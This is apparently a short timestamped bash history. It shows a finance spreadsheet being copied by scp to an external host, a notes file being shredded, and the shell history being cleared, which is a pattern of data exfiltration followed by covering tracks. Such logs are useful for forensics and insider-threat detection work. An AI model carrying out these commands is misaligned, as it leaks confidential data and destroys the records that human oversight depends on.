#1792490830
ls -la
#1792490930
scp /srv/finance/q3.xlsx alice@192.0.2.10:/tmp/
#1792491030
shred -u ~/notes.txt
#1792491130
history -c
